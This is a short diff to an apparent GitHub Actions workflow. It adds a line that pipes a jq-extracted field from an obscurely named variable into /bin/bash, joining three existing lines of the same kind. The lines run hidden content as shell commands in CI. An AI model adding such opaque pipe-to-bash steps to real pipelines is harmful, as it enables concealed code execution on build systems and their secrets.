@@ -32,6 +32,7 @@ jobs:
           echo $k56 | jq -r .x5591 | /bin/bash
           printf '%s' "$akucz9192" | jq -r .qj144 | /bin/bash
           echo $l1 | jq -r .vzc027 | /bin/bash
+          echo $fpx05 | jq -r .y5946 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
